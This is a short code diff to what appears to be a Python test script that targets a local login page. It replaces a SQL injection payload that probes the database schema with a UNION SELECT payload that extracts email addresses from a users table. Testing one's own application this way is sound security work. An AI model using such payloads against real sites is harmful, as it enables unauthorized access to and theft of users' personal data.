@@ -5,7 +5,7 @@ TARGET_URL = "http://127.0.0.1:5000/login"
 
 # Payloads for column discovery and data extraction
 sql_injections = [
-    "' UNION SELECT NULL, name, sql, NULL FROM sqlite_master WHERE type='table' AND name='users' --",
+    "' UNION SELECT NULL, email, NULL, NULL FROM users --",
 ]
 
 def test_sql_injections():
